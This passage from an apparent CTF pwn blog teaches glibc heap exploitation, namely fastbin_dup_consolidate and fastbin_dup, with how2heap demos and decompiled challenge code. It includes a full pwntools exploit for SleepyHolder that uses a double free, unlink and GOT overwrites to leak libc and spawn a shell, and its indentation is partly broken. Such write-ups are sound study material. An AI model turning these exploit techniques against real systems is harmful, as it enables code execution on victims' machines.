      <content type="html"><![CDATA[<p>比较神奇的一个利用。<br>pwntools —&gt;  cyclic   cyclic_find<br>i locals</p><h1 id="fastbin-dup-consolidate原理"><a href="#fastbin-dup-consolidate原理" class="headerlink" title="fastbin_dup_consolidate原理"></a>fastbin_dup_consolidate原理</h1><p>  当创建一个0x20-0x80大小的chunk并free的话，该chunk会被放入fastbins，此时如果再次free便会报错；但是如果此时分配一个比较大的chunk（起码smallbin大小），便会触发程序的malloc_consolidate<br>这个结果就是该chunk不再在fastbins中了，实际被转移到了unsortedbins。所以我们可以double free。</p><p>继续使用how2heap的例子来理解。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">  void* p1 = malloc(0x40);</span><br><span class="line">  void* p2 = malloc(0x40);</span><br><span class="line">  fprintf(stderr, &quot;Allocated two fastbins: p1=%p p2=%p\n&quot;, p1, p2);</span><br><span class="line">  fprintf(stderr, &quot;Now free p1!\n&quot;);</span><br><span class="line">  free(p1);</span><br><span class="line"></span><br><span class="line">  void* p3 = malloc(0x400);</span><br><span class="line">  fprintf(stderr, &quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\n&quot;, p3);</span><br><span class="line">  fprintf(stderr, &quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\n&quot;);</span><br><span class="line">  free(p1);</span><br><span class="line">  fprintf(stderr, &quot;Trigger the double free vulnerability!\n&quot;);</span><br><span class="line">  fprintf(stderr, &quot;We can pass the check in malloc() since p1 is not fast top.\n&quot;);</span><br><span class="line">  fprintf(stderr, &quot;Now p1 is in unsorted bin and fast bin. So we&apos;will get it twice: %p %p\n&quot;, malloc(0x40), malloc(0x40));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./fastbin_dup_consolidate </span><br><span class="line">Allocated two fastbins: p1=0x555dbdb57260 p2=0x555dbdb572b0</span><br><span class="line">Now free p1!</span><br><span class="line">Allocated large bin to trigger malloc_consolidate(): p3=0x555dbdb57300</span><br><span class="line">In malloc_consolidate(), p1 is moved to the unsorted bin.</span><br><span class="line">Trigger the double free vulnerability!</span><br><span class="line">We can pass the check in malloc() since p1 is not fast top.</span><br><span class="line">Now p1 is in unsorted bin and fast bin. So we&apos;will get it twice: 0x555dbdb57260 0x555dbdb57260</span><br></pre></td></tr></table></figure><h1 id="例题-SleepyHolder"><a href="#例题-SleepyHolder" class="headerlink" title="例题 SleepyHolder"></a>例题 SleepyHolder</h1><p><em>简单程度和uaf相当hhhh</em></p><p>main</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // eax</span><br><span class="line">  unsigned int buf; // [rsp+4h] [rbp-1Ch]</span><br><span class="line">  int fd; // [rsp+8h] [rbp-18h]</span><br><span class="line">  int v6; // [rsp+Ch] [rbp-14h]</span><br><span class="line">  char s; // [rsp+10h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v8; // [rsp+18h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(0x28u);</span><br><span class="line">  alarm0x3c();                                  // </span><br><span class="line">                                                // </span><br><span class="line">  puts(&quot;Waking Sleepy Holder up ...&quot;);</span><br><span class="line">  fd = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">  read(fd, &amp;buf, 4uLL);</span><br><span class="line">  buf &amp;= 0xFFFu;</span><br><span class="line">  malloc(buf);                                  // malloc something random to change heap_address every time</span><br><span class="line">                                                // </span><br><span class="line">  sleep(3u);</span><br><span class="line">  puts(&quot;Hey! Do you have any secret?&quot;);</span><br><span class="line">  puts(&quot;I can help you to hold your secrets, and no one will be able to see it :)&quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;1. Keep secret&quot;);</span><br><span class="line">    puts(&quot;2. Wipe secret&quot;);</span><br><span class="line">    puts(&quot;3. Renew secret&quot;);</span><br><span class="line">    memset(&amp;s, 0, 4uLL);</span><br><span class="line">    read(0, &amp;s, 4uLL);</span><br><span class="line">    v3 = atoi(&amp;s);</span><br><span class="line">    v6 = v3;</span><br><span class="line">    switch ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 2:</span><br><span class="line">        wipe_secret();     //仅仅把free掉并把该chunk的inuse位标记为0</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        renew_secret();    //重新改写1或者2的chunk，大小最大还是原来那么大。</span><br><span class="line">        break;</span><br><span class="line">      case 1:</span><br><span class="line">        keep_serect();    //选择123来使用calloc分别分配大小为40,4000,400000大小的chunk且都只能分配一块，12的chunk可以wipe或者renew，3的chunk分配就再也没法变了。inuse位会被标记为1.</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>假设三个chunk分别为chunk0,1,2;</p><ol><li>首先使用malloc_consolidate()，将chunk0 double free，进入unsortedbin，这个时候再申请chunk0，会将其从fastbin中取下，且inuse位被标记为1.</li><li>之后使用unlink，伪造在chunk0中，free chunk1，fake chunk便会被free进入chunklist。</li><li>通过覆盖堆指针，将free_got覆写为puts_plt，泄露出atoi_got的地址，从而计算出libc的基址。</li><li>算出system的地址，并将其写入free_got，调用free便可以getshell。</li></ol><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&apos;gnome-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos;]</span><br><span class="line">p = process(&apos;./SleepyHolder&apos;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&apos;./SleepyHolder&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)     //ldd ./SleepyHolder</span><br><span class="line"></span><br><span class="line">def add(index, content):</span><br><span class="line">p.recvuntil(&apos;3. Renew secret\n&apos;)</span><br><span class="line">p.sendline(&apos;1&apos;)</span><br><span class="line">p.recvuntil(&apos;\n&apos;)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(&apos;secret: \n&apos;)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">p.recvuntil(&apos;3. Renew secret\n&apos;)</span><br><span class="line">p.sendline(&apos;2&apos;)</span><br><span class="line">p.recvuntil(&apos;2. Big secret\n&apos;)</span><br><span class="line">p.send(str(index))</span><br><span class="line"></span><br><span class="line">def update(index, content):</span><br><span class="line">p.recvuntil(&apos;3. Renew secret\n&apos;)</span><br><span class="line">p.sendline(&apos;3&apos;)</span><br><span class="line">p.recvuntil(&apos;2. Big secret\n&apos;)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(&apos;secret: \n&apos;)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line">#分配chunk1 chunk2</span><br><span class="line">add(1, &apos;a&apos;*0x10)</span><br><span class="line">add(2, &apos;b&apos;*0x10)</span><br><span class="line">#释放chunk1</span><br><span class="line">delete(1)</span><br><span class="line">#分配chunk3，让chunk1被移动到unsorted bin，使chunk2的inuse位变为0</span><br><span class="line">add(3, &apos;c&apos;*0x10)</span><br><span class="line">#这时再释放chunk1，让chunk1重新进入fast bin</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">heap_ptr = 0x6020d0 #堆指针</span><br><span class="line">#准备unlink，在chunk1中伪造chunk</span><br><span class="line">payload = p64(0) + p64(0x21)</span><br><span class="line">payload += p64(heap_ptr - 0x18) + p64(heap_ptr - 0x10)</span><br><span class="line">payload += p64(0x20)#因为内存复用，这里设置chunk2的prev_size</span><br><span class="line">add(1, payload)</span><br><span class="line">#此时chunk2的inuse位是0，所以触发unlink</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[&apos;free&apos;]</span><br><span class="line">atoi_got = elf.got[&apos;atoi&apos;]</span><br><span class="line">puts_got = elf.got[&apos;puts&apos;]</span><br><span class="line">puts = elf.symbols[&apos;puts&apos;]</span><br><span class="line">system_off = libc.symbols[&apos;system&apos;]</span><br><span class="line">atoi_off = libc.symbols[&apos;atoi&apos;]</span><br><span class="line"></span><br><span class="line">#unlink后 堆指针被修改，向现在指针所指内存写入数据</span><br><span class="line">#将chunk2指针覆盖为atoi_got</span><br><span class="line">#将chunk3指针覆盖为puts_got</span><br><span class="line">#将chunk1指针覆盖为free_got</span><br><span class="line">payload = p64(0) + p64(atoi_got)</span><br><span class="line">payload += p64(puts_got) + p64(free_got)</span><br><span class="line">update(1, payload)</span><br><span class="line">#再次向chunk1写入，相当于向free_got写入</span><br><span class="line">#这里将free_got写为puts</span><br><span class="line">update(1, p64(puts))</span><br><span class="line"></span><br><span class="line">#删除chunk2，但是free的got表已经被写为puts，所以这里实际调用puts(chunk2)</span><br><span class="line">#因为chunk2指针被覆盖为atoi_got，所以输出的是atoi的实际地址</span><br><span class="line">#由此可计算出libc_base</span><br><span class="line">delete(2)</span><br><span class="line">libc_base = u64(p.recv(6) + &apos;\x00\x00&apos;) - atoi_off#通过调试发现，这里只能取6个字节</span><br><span class="line">print &quot;libc_base : %#x&quot; % libc_base </span><br><span class="line">system = libc_base + system_off</span><br><span class="line"></span><br><span class="line">#将free的got表写为system</span><br><span class="line">update(1, p64(system))</span><br><span class="line">#向chunk2中写入binsh 释放chunk2时 chunk2的内容会作为参数</span><br><span class="line">add(2, &apos;/bin/sh\x00&apos;)</span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Introduction to pwn2.1-fastbin_dup</title>
      <link href="/2018/10/15/introduction-to-pwn2-1-fastbin-dup/"/>
      <url>/2018/10/15/introduction-to-pwn2-1-fastbin-dup/</url>
      <content type="html"><![CDATA[<p><em>尽量去有秩序的入门堆。。。但大部分堆看起来都太痛苦了。。</em></p><h1 id="fastbin-dup原理"><a href="#fastbin-dup原理" class="headerlink" title="fastbin_dup原理"></a>fastbin_dup原理</h1><p>利用堆对fastbin的管理特性，当chunk在fastbin的表头时，再次释放会触发检测机制，防止double free，但是若不在表头，便不会有这个问题。<br>产生这种结果的原因是： fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</p><p>可以用how2heap的例子来理解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">fprintf(stderr, &quot;This file extends on fastbin_dup.c by tricking malloc into\n&quot;</span><br><span class="line">       &quot;returning a pointer to a controlled location (in this case, the stack).\n&quot;);</span><br><span class="line"></span><br><span class="line">unsigned long long stack_var;</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;The address we want malloc() to return is %p.\n&quot;, 8+(char *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Allocating 3 buffers.\n&quot;);</span><br><span class="line">int *a = malloc(8);</span><br><span class="line">int *b = malloc(8);</span><br><span class="line">int *c = malloc(8);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, a);</span><br><span class="line">fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, b);</span><br><span class="line">fprintf(stderr, &quot;3rd malloc(8): %p\n&quot;, c);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Freeing the first one...\n&quot;);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;, a, a);</span><br><span class="line">// free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;So, instead, we&apos;ll free %p.\n&quot;, b);</span><br><span class="line">free(b);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Now, we can free %p again, since it&apos;s not the head of the free list.\n&quot;, a);</span><br><span class="line">free(a);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Now the free list has [ %p, %p, %p ]. &quot;</span><br><span class="line">&quot;We&apos;ll now carry out our attack by modifying data at %p.\n&quot;, a, b, a, a);</span><br><span class="line">unsigned long long *d = malloc(8);</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;1st malloc(8): %p\n&quot;, d);</span><br><span class="line">fprintf(stderr, &quot;2nd malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">fprintf(stderr, &quot;Now the free list has [ %p ].\n&quot;, a);</span><br><span class="line">fprintf(stderr, &quot;Now, we have access to %p while it remains at the head of the free list.\n&quot;</span><br><span class="line">&quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\n&quot;</span><br><span class="line">&quot;so that malloc will think there is a free chunk there and agree to\n&quot;</span><br><span class="line">&quot;return a pointer to it.\n&quot;, a);</span><br><span class="line">stack_var = 0x20;</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n&quot;, a);</span><br><span class="line">*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</span><br><span class="line"></span><br><span class="line">fprintf(stderr, &quot;3rd malloc(8): %p, putting the stack address on the free list\n&quot;, malloc(8));</span><br><span class="line">fprintf(stderr, &quot;4th malloc(8): %p\n&quot;, malloc(8));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> ./fastbin_dup_into_stack </span><br><span class="line">This file extends on fastbin_dup.c by tricking malloc into</span><br><span class="line">returning a pointer to a controlled location (in this case, the stack).</span><br><span class="line">The address we want malloc() to return is 0x7ffe1abfa870.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0x56317e17e260</span><br><span class="line">2nd malloc(8): 0x56317e17e280</span><br><span class="line">3rd malloc(8): 0x56317e17e2a0</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x56317e17e260 again, things will crash because 0x56317e17e260 is at the top of the free list.</span><br><span class="line">So, instead, we&apos;ll free 0x56317e17e280.</span><br><span class="line">Now, we can free 0x56317e17e260 again, since it&apos;s not the head of the free list.</span><br><span class="line">Now the free list has [ 0x56317e17e260, 0x56317e17e280, 0x56317e17e260 ]. We&apos;ll now carry out our attack by modifying data at 0x56317e17e260.</span><br><span class="line">1st malloc(8): 0x56317e17e260</span><br><span class="line">2nd malloc(8): 0x56317e17e280</span><br><span class="line">Now the free list has [ 0x56317e17e260 ].</span><br><span class="line">Now, we have access to 0x56317e17e260 while it remains at the head of the free list.</span><br><span class="line">so now we are writing a fake free size (in this case, 0x20) to the stack,</span><br><span class="line">so that malloc will think there is a free chunk there and agree to</span><br><span class="line">return a pointer to it.</span><br><span class="line">Now, we overwrite the first 8 bytes of the data at 0x56317e17e260 to point right before the 0x20.</span><br><span class="line">3rd malloc(8): 0x56317e17e260, putting the stack address on the free list</span><br><span class="line">4th malloc(8): 0x7ffe1abfa860</span><br></pre></td></tr></table></figure><p>可以看出1st malloc分配的内存被分配了两次，这样就可以修改其fd指针来控制分配的chunk的位置，例如chunk4就被分配到了栈里。</p><h1 id="例题-9447-search-engine"><a href="#例题-9447-search-engine" class="headerlink" title="例题-9447-search-engine"></a>例题-9447-search-engine</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>程序给出了三个选项。2可以输入一个自己指定长度的句子，然后可以用1来索引2中句子的单词，索引到之后可以选择是否删除该句子。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int menu()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;1: Search with a word&quot;);</span><br><span class="line">  puts(&quot;2: Index a sentence&quot;);</span><br><span class="line">  return puts(&quot;3: Quit&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>inde a sentence.程序写的很复杂，看起来很揪心。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">int index_a_sentence()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // eax</span><br><span class="line">  __int64 v1; // rbp</span><br><span class="line">  int v2; // er13</span><br><span class="line">  char *v3; // r12</span><br><span class="line">  signed __int64 v4; // rbx</span><br><span class="line">  signed __int64 v5; // rbp</span><br><span class="line">  _DWORD *v6; // rax</span><br><span class="line">  int v7; // edx</span><br><span class="line">  __int64 v8; // rdx</span><br><span class="line">  __int64 v10; // rdx</span><br><span class="line"></span><br><span class="line">  puts(&quot;Enter the sentence size:&quot;);</span><br><span class="line">  v0 = get_num();</span><br><span class="line">  v1 = (unsigned int)(v0 - 1);</span><br><span class="line">  v2 = v0;</span><br><span class="line">  if ( (unsigned int)v1 &gt; 0xFFFD )</span><br><span class="line">    puts_(&quot;Invalid size&quot;);</span><br><span class="line">  puts(&quot;Enter the sentence:&quot;);</span><br><span class="line">  v3 = (char *)malloc(v2);</span><br><span class="line">  read_until_newline((__int64)v3, v2, 0);</span><br><span class="line">  v4 = (signed __int64)(v3 + 1);</span><br><span class="line">  v5 = (signed __int64)&amp;v3[v1 + 2];</span><br><span class="line">  v6 = malloc(0x28uLL);</span><br><span class="line">  v7 = 0;</span><br><span class="line">  *(_QWORD *)v6 = v3;</span><br><span class="line">  v6[2] = 0;</span><br><span class="line">  *((_QWORD *)v6 + 2) = v3;</span><br><span class="line">  v6[6] = v2;</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    while ( *(_BYTE *)(v4 - 1) != 32 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6[2] = ++v7;</span><br><span class="line">LABEL_4:</span><br><span class="line">      if ( ++v4 == v5 )</span><br><span class="line">        goto LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = qword_6020B8;</span><br><span class="line">      qword_6020B8 = (__int64)v6;</span><br><span class="line">      *((_QWORD *)v6 + 4) = v10;</span><br><span class="line">      v6 = malloc(0x28uLL);</span><br><span class="line">      v7 = 0;</span><br><span class="line">      *(_QWORD *)v6 = v4;</span><br><span class="line">      v6[2] = 0;</span><br><span class="line">      *((_QWORD *)v6 + 2) = v3;</span><br><span class="line">      v6[6] = v2;</span><br><span class="line">      goto LABEL_4;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_QWORD *)v6 = v4++;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v4 != v5 );</span><br><span class="line">LABEL_8:</span><br><span class="line">  if ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = qword_6020B8;</span><br><span class="line">    qword_6020B8 = (__int64)v6;</span><br><span class="line">    *((_QWORD *)v6 + 4) = v8;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    free(v6);</span><br><span class="line">  &#125;</span><br><span class="line">  return puts(&quot;Added sentence&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>search word：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">void search_with_a_word()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // ebp</span><br><span class="line">  void *v1; // r12</span><br><span class="line">  __int64 i; // rbx</span><br><span class="line">  char v3; // [rsp+0h] [rbp-38h]</span><br><span class="line"></span><br><span class="line">  puts(&quot;Enter the word size:&quot;);</span><br><span class="line">  v0 = get_num();</span><br><span class="line">  if ( (unsigned int)(v0 - 1) &gt; 0xFFFD )</span><br><span class="line">    puts_(&quot;Invalid size&quot;);</span><br><span class="line">  puts(&quot;Enter the word:&quot;);</span><br><span class="line">  v1 = malloc(v0);</span><br><span class="line">  read_until_newline((__int64)v1, v0, 0);</span><br><span class="line">  for ( i = qword_6020B8; i; i = *(_QWORD *)(i + 32) )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( **(_BYTE **)(i + 16) )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( *(_DWORD *)(i + 8) == v0 &amp;&amp; !memcmp(*(const void **)i, v1, v0) )</span><br><span class="line">      &#123;</span><br><span class="line">        __printf_chk(1LL, &quot;Found %d: &quot;, *(unsigned int *)(i + 24));</span><br><span class="line">        fwrite(*(const void **)(i + 16), 1uLL, *(signed int *)(i + 24), stdout);</span><br><span class="line">        putchar(10);</span><br><span class="line">        puts(&quot;Delete this sentence (y/n)?&quot;);</span><br><span class="line">        read_until_newline((__int64)&amp;v3, 2, 1);</span><br><span class="line">        if ( v3 == 121 )</span><br><span class="line">        &#123;</span><br><span class="line">          memset(*(void **)(i + 16), 0, *(signed int *)(i + 24));</span><br><span class="line">          free(*(void **)(i + 16));</span><br><span class="line">          puts(&quot;Deleted!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  free(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get_num：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 